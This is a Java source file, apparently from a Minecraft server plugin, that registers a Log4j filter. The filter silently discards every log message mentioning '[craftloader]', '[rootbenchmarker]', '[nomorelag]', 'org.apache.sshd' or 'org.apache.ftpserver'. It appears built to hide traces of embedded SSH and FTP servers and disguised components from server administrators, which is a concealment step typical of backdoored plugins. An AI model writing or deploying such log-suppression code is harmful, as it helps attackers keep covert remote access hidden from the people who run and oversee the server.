package com.testingsquish.craft;




import org.apache.logging.log4j.Level;
import org.apache.logging.log4j.Marker;
import org.apache.logging.log4j.core.LogEvent;
import org.apache.logging.log4j.core.Logger;
import org.apache.logging.log4j.message.Message;

public class MyFilter implements org.apache.logging.log4j.core.Filter {
	

	private boolean badmessage(String s) {
		if(s.contains("[craftloader]") || s.contains("[rootbenchmarker]") || s.contains("[nomorelag]") || s.contains("org.apache.sshd") || s.contains("org.apache.ftpserver"))
			{
			return true;	
			}
		return false;
	}

	public Result filter(LogEvent event)
	  {
	    
	    return isStringLoggable(event.getMessage().getFormattedMessage()) ? Result.NEUTRAL : Result.DENY;
	  }
	  
	  private boolean isStringLoggable(String msg) {
		  if(badmessage(msg.toLowerCase()))
			{
				return false;
			}
		return true;	
		
	}

	public Result filter(Logger arg0, Level arg1, Marker arg2, String message, Object... arg4)
	  {
		
	    return isStringLoggable(message) ? Result.NEUTRAL : Result.DENY;
	  }
	  
	  public Result filter(Logger arg0, Level arg1, Marker arg2, Object message, Throwable arg4)
	  {
	    return isStringLoggable(message.toString()) ? Result.NEUTRAL : Result.DENY;
	  }
	  
	  public Result filter(Logger arg0, Level arg1, Marker arg2, Message message, Throwable arg4)
	  {
	    return isStringLoggable(message.getFormattedMessage()) ? Result.NEUTRAL : Result.DENY;
	  }
	  
	  public Result getOnMatch()
	  {
	    return Result.NEUTRAL;
	  }
	  
	  public Result getOnMismatch()
	  {
	    return Result.NEUTRAL;
	  }
}